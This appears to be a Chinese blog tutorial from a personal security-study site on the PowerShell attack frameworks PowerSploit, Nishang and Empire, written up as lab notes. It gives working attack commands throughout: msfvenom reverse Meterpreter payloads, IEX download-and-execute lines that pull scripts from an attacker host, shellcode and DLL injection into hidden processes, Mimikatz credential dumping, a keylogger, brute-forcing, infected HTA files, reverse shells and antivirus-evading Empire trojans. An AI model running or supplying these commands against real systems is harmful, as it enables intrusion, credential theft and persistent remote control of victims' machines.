<h4 id="各模块功能"><a href="#各模块功能" class="headerlink" title="各模块功能"></a>各模块功能</h4><h5 id="一、代码执行（CodeExecution）"><a href="#一、代码执行（CodeExecution）" class="headerlink" title="一、代码执行（CodeExecution）"></a>一、代码执行（CodeExecution）</h5><ul>
<li>Invoke-DllInjection </li>
<li>Invoke-ReflectivePElnjection</li>
<li>Invoke-Shellcode</li>
<li>Invoke-WmiCommand</li>
</ul>
<h5 id="二、脚本修改（ScriptModification）"><a href="#二、脚本修改（ScriptModification）" class="headerlink" title="二、脚本修改（ScriptModification）"></a>二、脚本修改（ScriptModification）</h5><ul>
<li>Out-EncodedCommand</li>
<li>Out-CompressedDll</li>
<li>Out-EncryptedScript</li>
<li>Remove-Comments</li>
</ul>
<h5 id="三、权限维持（Persistence）"><a href="#三、权限维持（Persistence）" class="headerlink" title="三、权限维持（Persistence）"></a>三、权限维持（Persistence）</h5><ul>
<li>New-UserPersistenceOption</li>
<li>New-ElevatedPersistenceOption</li>
<li>Add-Persistence</li>
<li>Install-SSP</li>
<li>Get-SecurityPackages</li>
</ul>
<h5 id="四、绕过杀毒软件（AntivirusBypass）"><a href="#四、绕过杀毒软件（AntivirusBypass）" class="headerlink" title="四、绕过杀毒软件（AntivirusBypass）"></a>四、绕过杀毒软件（AntivirusBypass）</h5><p>Find-AVSignature</p>
<h5 id="五、信息收集（Exfiltration）"><a href="#五、信息收集（Exfiltration）" class="headerlink" title="五、信息收集（Exfiltration）"></a>五、信息收集（Exfiltration）</h5><p>这个文件夹主要是收集目标主机上的信息。</p>
<h5 id="六、信息侦察（Recon）"><a href="#六、信息侦察（Recon）" class="headerlink" title="六、信息侦察（Recon）"></a>六、信息侦察（Recon）</h5><p>这个文件夹主要是以目标主机为跳板进行内网主机侦察。</p>
<h4 id="搭建PowerSploit脚本服务器"><a href="#搭建PowerSploit脚本服务器" class="headerlink" title="搭建PowerSploit脚本服务器"></a>搭建PowerSploit脚本服务器</h4><p>1.下载PowerSploit到服务器</p>
<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">git <span class="keyword">clone</span>  <span class="title">https</span>://github.com/mattifestation/PowerSploit.git</span><br></pre></td></tr></table></figure>

<p>2.启动Apache</p>
<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">service apache2 <span class="literal">start</span></span><br></pre></td></tr></table></figure>

<p>3.本地查看是否成功搭建</p>
<h4 id="Invoke-Shellcode"><a href="#Invoke-Shellcode" class="headerlink" title="Invoke-Shellcode"></a>Invoke-Shellcode</h4><p>​    CodeExecution模块下的Invoke-Shellcode脚本常用于将Shellcode插入指定的进程ID或本地PowerShell中，下面介绍两种常用的反弹Meterpreter Shell方法。</p>
<h5 id="1-直接执行shellcode反弹Meterpreter-Shell"><a href="#1-直接执行shellcode反弹Meterpreter-Shell" class="headerlink" title="1.直接执行shellcode反弹Meterpreter Shell"></a>1.直接执行shellcode反弹Meterpreter Shell</h5><p>在MSF里使用reverse_https模块进行监听</p>
<p>使用msfvenom命令生成一个powershell脚本木马</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_https LHOST=<span class="number">192.168</span><span class="number">.157</span><span class="number">.139</span> LPORT=<span class="number">4444</span> -f powershell -o test</span><br></pre></td></tr></table></figure>

<p>接着在目标机Powershell下输入以下命令下载该脚本</p>
<figure class="highlight cos"><table><tr><td class="code"><pre><span class="line">PS C:\Users\<span class="keyword">zn</span>&gt; IEX (<span class="keyword">New</span>-Object Net.WebClient).DownloadString(<span class="string">"http://192.168.157.139/PowerSploit/CodeExecution/Invoke-Shellcode.ps1"</span>)</span><br></pre></td></tr></table></figure>

<p>接着输入以下命令下载木马</p>
<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">IEX</span> (New-Object Net.WebClient)<span class="selector-class">.DownloadString</span>(<span class="string">"http://192.168.139/test"</span>)</span><br></pre></td></tr></table></figure>

<p>接着在powershell下运行如下命令</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">PS C:\Users\zn&gt; Invoke-<span class="keyword">Shellcode </span>-<span class="keyword">Shellcode </span>($<span class="keyword">buf) </span>-Force</span><br></pre></td></tr></table></figure>

<p>其中的-Force意思是不用提示，直接执行。</p>
<p>​    按理说，此步骤执行完成后，返回MSF的监听界面下，会发现已经反弹成功了，可是我的Powershell在运行完Invoke-Shellcode -Shellcode ($buf) -Force命令后直接提示“Windows PowerShell已停止工作”，然后就崩溃了，导致不能反弹成功，不知道为啥。</p>
<h5 id="2-指定进程注入shellcode反弹Meterpreter-Shell"><a href="#2-指定进程注入shellcode反弹Meterpreter-Shell" class="headerlink" title="2.指定进程注入shellcode反弹Meterpreter Shell"></a>2.指定进程注入shellcode反弹Meterpreter Shell</h5><p>同样先在目标机Powershell下输入命令下载脚本和木马</p>
<figure class="highlight cos"><table><tr><td class="code"><pre><span class="line">PS C:\Users\<span class="keyword">zn</span>&gt; IEX (<span class="keyword">New</span>-Object Net.WebClient).DownloadString(<span class="string">"http://192.168.157.139/PowerSploit/CodeExecution/Invoke-Shellcode.ps1"</span>)</span><br><span class="line">PS C:\Users\<span class="keyword">zn</span>&gt; IEX (<span class="keyword">New</span>-Object Net.WebClient).DownloadString(<span class="string">"http://192.168.157.139/test"</span>)</span><br></pre></td></tr></table></figure>

<p>接着输入Get-Process命令或者ps命令查看当前进程</p>
<p>然后输入以下命令创建一个新的进程，并把它设置为隐藏的，再输入Get-Process命令查看进程，可以看到多了一个id为2668，名为notepad的进程</p>
<figure class="highlight dsconfig"><table><tr><td class="code"><pre><span class="line"><span class="string">PS </span>C:\<span class="string">Users\</span><span class="string">zn&gt;</span> <span class="string">start-process </span>C:\<span class="string">Windows\</span><span class="string">System32\</span><span class="string">notepad.</span><span class="string">exe </span>-<span class="string">WindowStyle </span><span class="string">Hidden</span></span><br><span class="line"><span class="string">PS </span>C:\<span class="string">Users\</span><span class="string">zn&gt;</span> <span class="built_in">get-process</span> <span class="string">notepad</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Handles </span> <span class="string">NPM(</span>K)    <span class="string">PM(</span>K)      <span class="string">WS(</span>K) <span class="string">VM(</span>M)   <span class="string">CPU(</span>s)     <span class="string">Id </span><span class="string">ProcessName</span></span><br><span class="line"><span class="string">-</span>------  ------    -----      ----- -----   ------     -- -----------</span><br><span class="line">     <span class="string">56 </span>      7     <span class="string">1424 </span>      <span class="string">5384 </span>   <span class="string">75 </span>    0.<span class="string">02 </span>  <span class="string">2668 </span><span class="string">notepad</span></span><br></pre></td></tr></table></figure>

<p>接着输入以下命令，使用Invoke-Shellcode脚本进行进程注入</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">PS C:\Users\zn&gt; Invoke-<span class="keyword">Shellcode </span>-ProcessID <span class="number">2668</span> -<span class="keyword">Shellcode </span>($<span class="keyword">buf) </span>-Force</span><br><span class="line">记事本已停止工作</span><br></pre></td></tr></table></figure>

<p>同样的，按理说，此步骤执行完成后，返回MSF的监听界面下，会发现已经反弹成功了，可是我的Powershell在运行完Invoke-Shellcode -Shellcode ($buf) -Force命令后直接提示“Windows PowerShell已停止工作”，然后就崩溃了，导致不能反弹成功。</p>
<h4 id="Invoke-DllInjection"><a href="#Invoke-DllInjection" class="headerlink" title="Invoke-DllInjection"></a>Invoke-DllInjection</h4><p>下面使用CodeExecution模块下的另一个脚本Invoke-DllInjection，它是一个DLL注入的脚本。</p>
<p>同理还是首先在MSF里配置好监听，与上面的相同。</p>
<p>然后使用以下命令在kali中生成一个dll的反弹木马</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# msfvenom -p windows/meterpreter/reverse_https LHOST=<span class="number">192.168</span><span class="number">.157</span><span class="number">.139</span> LPORT=<span class="number">4444</span> -f dll -o /var/www/html/test.dll</span><br></pre></td></tr></table></figure>

<p>将test.dll下载到目标机</p>
<p>然后在目标机上下载脚本，输入以下命令</p>
<figure class="highlight cos"><table><tr><td class="code"><pre><span class="line">PS C:\Users\<span class="keyword">zn</span>&gt; IEX (<span class="keyword">New</span>-Object Net.WebClient).DownloadString(<span class="string">"http://192.168.157.139/PowerSploit/CodeExecution/Invoke-DllInjection.ps1"</span>)</span><br></pre></td></tr></table></figure>

<p>接着启动一个新进程，使用Invoke-Shellcode脚本进行进程注入</p>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">PS C:<span class="symbol">\U</span>sers<span class="symbol">\z</span>n&gt; start-process C:<span class="symbol">\W</span>indows<span class="symbol">\S</span>ystem32<span class="symbol">\n</span>otepad.exe -WindowStyle Hidden</span><br><span class="line">PS C:<span class="symbol">\U</span>sers<span class="symbol">\z</span>n&gt; get-process notepad</span><br><span class="line"></span><br><span class="line">Handles  NPM(K)    PM(K)      WS(K) VM(M)   CPU(s)     Id ProcessName</span><br><span class="line">-------  ------    -----      ----- -----   ------     -- -----------</span><br><span class="line">     56       7     1424       5300    75     0.00   2008 notepad</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PS C:<span class="symbol">\U</span>sers<span class="symbol">\z</span>n&gt; Invoke-DllInjection -ProcessID 2008 -Dll C:<span class="symbol">\U</span>sers<span class="symbol">\z</span>n<span class="symbol">\t</span>est.dll #先将文件下载到此处</span><br><span class="line">You cannot inject a 32-bit DLL into a 64-bit process.</span><br></pre></td></tr></table></figure>

<h4 id="Invoke-Portscan"><a href="#Invoke-Portscan" class="headerlink" title="Invoke-Portscan"></a>Invoke-Portscan</h4><p>nvoke-Portscan是Recon模块下的一个脚本，主要用于端口扫描，使用起来也比较简单。使用方法如下</p>
<p>先下载脚本，然后进行扫描</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">PS <span class="string">C:</span>\&gt; IEX (New-Object Net.WebClient).DownloadString(<span class="string">"http://192.168.157.139/PowerSploit/Recon/Invoke-Portscan.ps1"</span>)</span><br><span class="line"></span><br><span class="line">PS <span class="string">C:</span>\&gt; Invoke-Portscan -Hosts <span class="number">192.168</span><span class="number">.157</span><span class="number">.138</span> -Ports <span class="string">"80,22,3389"</span></span><br></pre></td></tr></table></figure>

<h4 id="Invoke-Mimikatz"><a href="#Invoke-Mimikatz" class="headerlink" title="Invoke-Mimikatz"></a>Invoke-Mimikatz</h4><p>Invoke-Mimikatz是Exfiltration模块下的一个脚本。使用方法如下</p>
<p>先下载脚本，然后执行命令即可</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">PS <span class="string">C:</span>\&gt; IEX (New-Object Net.WebClient).DownloadString(<span class="string">"http://192.168.157.139/PowerSploit/Exfiltration/Invoke-Mimikatz.ps1"</span>)</span><br><span class="line">PS <span class="string">C:</span>\&gt; Invoke-Mimikatz -DumpCreds</span><br></pre></td></tr></table></figure>

<p>这里需要注意一点，和使用Mimikatz工具一样，内置的Mimikatz在使用时同样需要管理员权限。</p>
<h4 id="Get-Keystrokes"><a href="#Get-Keystrokes" class="headerlink" title="Get-Keystrokes"></a>Get-Keystrokes</h4><p>Get-Keystrokes是Exfiltration模块下的一个脚本，用于键盘记录，功能相当强大，不仅有键盘输入记录，甚至能记录鼠标的点击情况，还能记录详细的时间，实战时可以直接放入后台运行。使用方法如下。</p>
<p>先下载脚本，然后使用命令开启键盘记录，这里输入几个字母测试一下。</p>
<figure class="highlight livescript"><table><tr><td class="code"><pre><span class="line">PS C:<span class="string">\&gt;</span> IEX (New-Object Net.WebClient).DownloadString(<span class="string">"http://192.168.157.139/PowerSploit/Exfiltration/Get-Keystrokes.ps1</span></span><br><span class="line"><span class="string">"</span>)</span><br><span class="line"></span><br><span class="line">PS C:<span class="string">\&gt;</span> Get-Keystrokes -LogPath C:<span class="string">\Users\zn\test1.txt</span></span><br><span class="line">PS C:<span class="string">\&gt;</span> sdfsadadads</span><br><span class="line"> </span><br><span class="line">打开test1.txt查看：</span><br><span class="line"><span class="string">"TypedKey"</span>,<span class="string">"WindowTitle"</span>,<span class="string">"Time"</span></span><br><span class="line"><span class="string">"s"</span>,<span class="string">"Windows PowerShell"</span>,<span class="string">"2020/1/16 18:57:13"</span></span><br><span class="line"><span class="string">"d"</span>,<span class="string">"Windows PowerShell"</span>,<span class="string">"2020/1/16 18:57:13"</span></span><br><span class="line"><span class="string">"f"</span>,<span class="string">"Windows PowerShell"</span>,<span class="string">"2020/1/16 18:57:13"</span></span><br><span class="line"><span class="string">"s"</span>,<span class="string">"Windows PowerShell"</span>,<span class="string">"2020/1/16 18:57:13"</span></span><br><span class="line"><span class="string">"a"</span>,<span class="string">"Windows PowerShell"</span>,<span class="string">"2020/1/16 18:57:13"</span></span><br><span class="line"><span class="string">"d"</span>,<span class="string">"Windows PowerShell"</span>,<span class="string">"2020/1/16 18:57:13"</span></span><br><span class="line"><span class="string">"a"</span>,<span class="string">"Windows PowerShell"</span>,<span class="string">"2020/1/16 18:57:14"</span></span><br><span class="line"><span class="string">"d"</span>,<span class="string">"Windows PowerShell"</span>,<span class="string">"2020/1/16 18:57:14"</span></span><br><span class="line"><span class="string">"a"</span>,<span class="string">"Windows PowerShell"</span>,<span class="string">"2020/1/16 18:57:14"</span></span><br><span class="line"><span class="string">"d"</span>,<span class="string">"Windows PowerShell"</span>,<span class="string">"2020/1/16 18:57:14"</span></span><br><span class="line"><span class="string">"s"</span>,<span class="string">"Windows PowerShell"</span>,<span class="string">"2020/1/16 18:57:14"</span></span><br><span class="line"><span class="string">"d"</span>,<span class="string">"C:\Users\zn\test1.txt - Notepad++"</span>,<span class="string">"2020/1/16 18:57:45"</span></span><br><span class="line"><span class="string">"a"</span>,<span class="string">"*C:\Users\zn\test1.txt - Notepad++"</span>,<span class="string">"2020/1/16 18:57:45"</span></span><br><span class="line"><span class="string">"s"</span>,<span class="string">"*C:\Users\zn\test1.txt - Notepad++"</span>,<span class="string">"2020/1/16 18:57:45"</span></span><br></pre></td></tr></table></figure>

<h4 id="PowerUp"><a href="#PowerUp" class="headerlink" title="PowerUp"></a>PowerUp</h4><p>主要来介绍PowerUp模块，powerUp拥有众多用来寻找目标主机的Windows服务漏洞进行提权的实用脚本，先下载脚本：</p>
<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">IEX</span> (New-Object Net.WebClient)<span class="selector-class">.DownloadString</span>(<span class="string">"http://192.168.157.139/PowerSploit/Privesc/PowerUp.ps1"</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/21/powershell-shen-tou-xue-xi/1344396-20181223213723305-325093325.png" alt="img"></p>
<p>1.<strong>Invoke-AllChecks</strong></p>
<p>该模块会自动执行PowerUp下所有模块来检查目的主机：</p>
<p><img src="/2020/07/21/powershell-shen-tou-xue-xi/1344396-20181223213939733-173322209.png" alt="img"></p>
<p>2.<strong>Find-PathDLLHijack</strong></p>
<p>该模块用于检查当前%PATH%的哪些目录是用户可以写入的：</p>
<p><img src="/2020/07/21/powershell-shen-tou-xue-xi/1344396-20181223214157646-1940987848.png" alt="img"></p>
<p>3.<strong>Get-ServiceDetail</strong></p>
<p>该模块用于返回某服务的信息：</p>
<p><img src="/2020/07/21/powershell-shen-tou-xue-xi/1344396-20181223214527227-1884968775.png" alt="img"></p>
<h3 id="Powershell渗透框架nishang"><a href="#Powershell渗透框架nishang" class="headerlink" title="Powershell渗透框架nishang"></a>Powershell渗透框架nishang</h3><h4 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h4><p>​        Nishang是一个PowerShell脚本和有效载荷的框架和集合，它使PowerShell能够用于攻击安全性、渗透测试和红队。它是基于PowerShell的渗透测试专用工具，集成了框架、脚本和各种Payload，包括下载和执行、键盘记录、DNS、延时命令等脚本，被广泛用于渗透测试的各个阶段。Nishang在PowerShell3.0及以上的环境中才能正常使用，所以Windows7、Server2008下默认是有点小问题的。</p>
<p>项目地址：<a href="https://github.com/samratashok/nishang" target="_blank" rel="noopener">https://github.com/samratashok/nishang</a></p>
<p><img src="/2020/07/21/powershell-shen-tou-xue-xi/20191208151623232.png" alt></p>
<h5 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h5><ul>
<li>ActiveDirectory：活动目录</li>
<li>Antak-WebShell：WebShell</li>
<li>Backdoors：后门</li>
<li>Bypass：绕过</li>
<li>Client：客户端</li>
<li>Escalation：提权</li>
<li>Execution：执行</li>
<li>Gather：信息收集</li>
<li>MITM：</li>
<li>Misc：发音</li>
<li>Pivot：跳板、远程执行exe</li>
<li>Prasadhak：Virustotal </li>
<li>Scan：扫描</li>
<li>Shells：shell</li>
<li>Utility：杂项</li>
<li>Powerpreter：Meterpreter会话</li>
</ul>
<h4 id="Nishang使用姿势"><a href="#Nishang使用姿势" class="headerlink" title="Nishang使用姿势"></a>Nishang使用姿势</h4><p>导入所有的脚本到当前的PowerShell会话中(PowerShell v3之前)</p>
<figure class="highlight coq"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Import</span>-<span class="keyword">Module</span> -verbose  .\nishang.psm1</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/21/powershell-shen-tou-xue-xi/QQ%E6%88%AA%E5%9B%BE20200720162040.png" alt></p>
<p>然后输入命令：<code>Get-Command -Module nishang</code></p>
<p>查看nishang有哪些功能</p>
<p><img src="/2020/07/21/powershell-shen-tou-xue-xi/QQ%E6%88%AA%E5%9B%BE20200720162317.png" alt></p>
<h4 id="nishang常用脚本"><a href="#nishang常用脚本" class="headerlink" title="nishang常用脚本"></a>nishang常用脚本</h4><p>​    Nishang基本上包含了渗透测试各个阶段的脚本，在扫描阶段，它也有两个很实用的脚本暴力破解和端口扫描。</p>
<h5 id="1-暴力破解-（Invoke-BruteForce"><a href="#1-暴力破解-（Invoke-BruteForce" class="headerlink" title="1.暴力破解 （Invoke-BruteForce)"></a>1.暴力破解 （Invoke-BruteForce)</h5><p>Invoke-BruteForce是Nishang中一个专注于暴力破解的脚本，它可以破解SQL Server、ActiveDirecotry、FTP、Web等服务。</p>
<p>使用实例：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">Invoke-BruteForce</span> <span class="selector-tag">-ComputerName</span> <span class="selector-tag">SQLServ01</span> <span class="selector-tag">-UserList</span> <span class="selector-tag">C</span><span class="selector-pseudo">:testusername.txt</span> <span class="selector-tag">-PasswordList</span> <span class="selector-tag">C</span><span class="selector-pseudo">:testpassword.txt</span> <span class="selector-tag">-Service</span> <span class="selector-tag">SQL</span> <span class="selector-tag">-Verbose</span></span><br></pre></td></tr></table></figure>

<h5 id="2-端口扫描"><a href="#2-端口扫描" class="headerlink" title="2.端口扫描"></a>2.端口扫描</h5><p>Invoke-PortScan是Nishang中一个端口扫描脚本，它可以发现主机、解析主机名、端口扫描，是实战中一个很实用的脚本。</p>
<p>参数介绍：</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">-StartAddress &lt;<span class="keyword">String</span>&gt;起始IP-EndAddress &lt;<span class="keyword">String</span>&gt;终止IP-ResolveHost 加上这个参数，解析主机名。-ScanPort 加上这个参数，扫描端口-Ports 指定扫描的端口</span><br></pre></td></tr></table></figure>

<p>发现存活主机，解析主机名、扫描80端口是否开放。</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">Invoke -StartAddress <span class="number">192.168</span><span class="number">.110</span><span class="number">.1</span> -EndAddress <span class="number">192.168</span><span class="number">.110</span><span class="number">.130</span> -ResolveHost -ScanPort -Ports <span class="number">80</span></span><br></pre></td></tr></table></figure>

<h5 id="3-下载文件"><a href="#3-下载文件" class="headerlink" title="3.下载文件"></a>3.下载文件</h5><p>​    Download_Execute是Nishang中一个下载执行脚本，它在实战中最常用的功能就是下载一个文本文件，然后将其转换为可执行文件执行。</p>
<p>用实例：</p>
<p>第一步：首先我们需要使用Nishang中的exetotext.ps1脚本将可执行文件更改为文本文件。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">PS</span> <span class="selector-tag">C</span><span class="selector-pseudo">:Usersroot</span>&gt; <span class="selector-tag">ExetoText</span> <span class="selector-tag">c</span>:\<span class="selector-tag">powershellmsf</span><span class="selector-class">.exe</span> <span class="selector-tag">c</span>:\<span class="selector-tag">powershellmsf</span><span class="selector-class">.txt</span> <span class="selector-tag">Converted</span> <span class="selector-tag">file</span> <span class="selector-tag">written</span> <span class="selector-tag">to</span> <span class="selector-tag">c</span>:\<span class="selector-tag">powershellmsf</span><span class="selector-class">.txt</span></span><br></pre></td></tr></table></figure>

<p>第二步：使用Download_Execute下载执行文本文件</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">PS <span class="string">C:</span>Usersroot&gt; Download_Execute <span class="string">http:</span><span class="comment">//192.168.110.128/msf.txt</span></span><br></pre></td></tr></table></figure>

<p>使用实例：</p>
<p>第一步：首先我们需要使用Nishang中的exetotext.ps1脚本将可执行文件更改为文本文件。</p>
<h5 id="4-信息收集"><a href="#4-信息收集" class="headerlink" title="4.信息收集"></a>4.信息收集</h5><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> Check-VM 这是Nishang中检测目标机是否为虚拟机的脚本。</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> Copy-VSS 使用卷影拷贝服务来复制SAM文件。</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span> Get-Information 从目标机上获取有价值信息的脚本</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span> Get-PassHashes 从目标机上获取Hash密码的脚本。</span><br><span class="line"></span><br><span class="line"><span class="number">5.</span> Get-WLAN-Keys 从目标机上获取纯文本的WLAN密钥。</span><br><span class="line"></span><br><span class="line"><span class="number">6.</span> Keylogger 键盘记录脚本，大家应该都熟悉。</span><br><span class="line"></span><br><span class="line"><span class="number">7.</span> Invoke-Mimikatz 在内存中加载Mimikatz，Mimikatz大家都熟悉吧，不作介绍了。</span><br></pre></td></tr></table></figure>

<h5 id="5-后门利用"><a href="#5-后门利用" class="headerlink" title="5.后门利用"></a>5.后门利用</h5><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> HTTP-Backdoor 可以接收来自第三方网站的指令，并在内存中执行PowerShell脚本。</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> DNS_TXT_Pwnage 可以在DNS TXT查询中接收指令和PowerShell脚本，并在目标机上执行。</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span> Execute-OnTime 可以在目标机上指定时间执行PowerShell脚本。</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span> Gupt-Backdoor 可以从WLAN SSID中接收命令和脚本，而不用去连接它。</span><br></pre></td></tr></table></figure>

<h5 id="6-客户端攻击"><a href="#6-客户端攻击" class="headerlink" title="6.客户端攻击"></a>6.客户端攻击</h5><p>​        Nishang中还有生成各种危害文件的脚本，它们可以生成各种感染的文件，如HTA、Word，来执行powershell脚本。可以神不知鬼不觉的发动攻击，由于各个脚本用法相同，这里以生成受感染的HTA为例子。</p>
<p><strong>Out-HTA</strong></p>
<p>功能：创建受感染的HTA文件，可以执行PowerShell命令和脚本。</p>
<p>用法实例：</p>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">PS C:<span class="symbol">\n</span>ishang-master&gt; Out-HTA -PayloadScript C:<span class="symbol">\n</span>ishang-master<span class="symbol">\S</span>hells<span class="symbol">\I</span>nvoke-PowerShellTcpOneLine.ps1 -HTAFilePath C:<span class="symbol">\H</span>ACKER.HTA</span><br></pre></td></tr></table></figure>

<p>第一步：我们先来创建受感染的HTA文件。在下图中我们可以发现成功生成了一个受感染的HTA文件hacker.hta</p>
<p>第二步：先使用nc来监听端口，然后运行受感染的HTA文件，可以发现成功反弹Shell</p>
<h5 id="7-powershell交互式shell"><a href="#7-powershell交互式shell" class="headerlink" title="7.powershell交互式shell"></a>7.powershell交互式shell</h5><h5 id="基于TCP协议的Powershell交互式shell"><a href="#基于TCP协议的Powershell交互式shell" class="headerlink" title="基于TCP协议的Powershell交互式shell"></a>基于TCP协议的Powershell交互式shell</h5><p>Invoke-PowerShellTcp是PowerShell交互式正向连接或反向连接shell，基于TCP协议</p>
<p><strong>1.正向连接</strong></p>
<p>目标机运行</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">invoke-powershelltcp -bind -port <span class="number">86</span></span><br></pre></td></tr></table></figure>

<p>本地nc连接到目标机端口86</p>
<p><img src="/2020/07/21/powershell-shen-tou-xue-xi/QQ%E6%88%AA%E5%9B%BE20200720163135.png" alt></p>
<p><strong>2.反向连接</strong></p>
<p>第一步：使用nc监听本地端口86（注意必须先监听，不然在目标机上执行脚本会出错）</p>
<p>第二步：在目标机上反弹shell</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">invoke-powershelltcp -reverse -ipaddress <span class="number">192.168</span><span class="number">.157</span><span class="number">.138</span> -port <span class="number">86</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/21/powershell-shen-tou-xue-xi/QQ%E6%88%AA%E5%9B%BE20200720163923.png" alt></p>
<h5 id="基于UDP协议的Powershell交互式shell"><a href="#基于UDP协议的Powershell交互式shell" class="headerlink" title="基于UDP协议的Powershell交互式shell"></a>基于UDP协议的Powershell交互式shell</h5><p>Invoke-PowerShellUdpPowershell交互式正向连接或反向连接shell，基于UDP协议。</p>
<h5 id="基于HTTP和HTTPS协议的PowerShell交互式Shell"><a href="#基于HTTP和HTTPS协议的PowerShell交互式Shell" class="headerlink" title="基于HTTP和HTTPS协议的PowerShell交互式Shell"></a>基于HTTP和HTTPS协议的PowerShell交互式Shell</h5><p>Invoke-PoshRatHttp and Invoke-PoshRatHttps是Powershell交互式反向连接shell，基于HTTP协议和HTTPS协议。</p>
<h3 id="Powershell渗透框架empire"><a href="#Powershell渗透框架empire" class="headerlink" title="Powershell渗透框架empire"></a>Powershell渗透框架empire</h3><p>​    empire 是一个针对内网针对域控的一个渗透测试框架，和 msf 类似。其中集成了很多内网的一些工具以及命令，使用方便，且 empire 生成的木马文件基于 powershell，所以在 windows 平台上有很好的免杀效果。结合 msf 使用更是如虎添翼。empire 安装下载命令如下：</p>
<p>安装后，在其目录执行./empire 文件即可，打开后如下图：</p>
<p><img src="/2020/07/21/powershell-shen-tou-xue-xi/format,png" alt="请输入图片描述"></p>
<p>empire 包含三个部分，一个是 modules 即自身的一些模块，一个是 listernes 即监听类似 msf 的 exploit/multi/handler 模块，一个是 agents 即已经链接上的会话类似 msf 存的 session。</p>
<h4 id="0x01：设置监听"><a href="#0x01：设置监听" class="headerlink" title="0x01：设置监听"></a>0x01：设置监听</h4><p>​        使用 empire 首先设置一个监听，输入 listeners 命令进入监听模块，进入后需要使用监听种类，输入 uselistener 加空格然后两下 tab 可列出所有的可使用监听类，这里我们使用 http，随后输入 info 可查看吃类监听的详细信息，如下图：</p>
<p><img src="/2020/07/21/powershell-shen-tou-xue-xi/format,png" alt="请输入图片描述"></p>
<p>​        这里需要设置下 name 参数，随意定义一个名字，例如 test，然后另外还要注意下 host 参数和 prot，即监听使用的 ip 和端口，一般默认即可，就是自己本机的 ip 和 80。设置无误后，通过 execute 执行，如下图：</p>
<p>ps：listeners 模块下通过 list 命令可查看已经设置的监听。</p>
<h4 id="0x02：生成木马"><a href="#0x02：生成木马" class="headerlink" title="0x02：生成木马"></a>0x02：生成木马</h4><p>​        设置好监听后通过 back 命令返回上一级，然后使用 usestager 命令来指定生成木马的类型，老规矩，通过空格加两下 tab 可查看所有生成文件的类型，这里我们使用 windows/launcher_bat，即 windows 平台下的 bat 文件，同样，通过 info 查看此模块的详细信息，如下图：</p>
<p><img src="/2020/07/21/powershell-shen-tou-xue-xi/format.png" alt="请输入图片描述"></p>
<p>生成的文件类型大体有三类，multi 开头的是通用类，osx 开头即 mac 使用，windows 即 win 平台使用。使用 launcher_bat 模块后，通过 info 我们看到了参数信息，这里需要设置一个 Listener 参数，即监听的名字，就是我们刚才的 test，设置后通过 execute 执行，文件会生成到 tmp 目录下，如下图：</p>
<p><img src="/2020/07/21/powershell-shen-tou-xue-xi/fghjfghj.jpg" alt="请输入图片描述"></p>
<p>我们打开这个文件看下，可以看到是 poershell 命令，然后通过 base64 编码，如下图：</p>
<p><img src="/2020/07/21/powershell-shen-tou-xue-xi/sdfgsdfg.jpg" alt="请输入图片描述"></p>
<p>这时我们 back 返回监听那一级，然后等待目标执行我们的木马文件就回得到其 shell，这里的 bat 我第一次运行 360 是没报毒，腾讯管家也没有报，火绒有报，第二次 360 报了，其他类型的文件有时会报，有时不报，原因还在看，大家下面可以试试，我们诱导目标机执行后，就会得到它的 shell，如下图：</p>
<p><img src="/2020/07/21/powershell-shen-tou-xue-xi/gghkghjk.jpg" alt="请输入图片描述"></p>
<p>这里我可能多点了一下执行力两边，我们通过 agents 就可查看目前得到的 shell，随后通过 interact 加 name 命令即可进入 shell 中，name 就是 shell 随机给的名称，进入后我们通过 help 可查看一些命令和一些提供的内网渗透常用的工具，如下图：</p>
<p><img src="/2020/07/21/powershell-shen-tou-xue-xi/dfghfgdh.jpg" alt="请输入图片描述"></p>
]]></content>
      <categories>
        <category>内网与域渗透学习</category>
      </categories>
      <tags>
        <tag>Powershell</tag>
      </tags>
  </entry>
  <entry>
    <title>SRC混子的漏洞挖掘之道</title>
    <url>/2021/01/16/src-hun-zi-de-lou-dong-wa-jue-zhi-dao/</url>
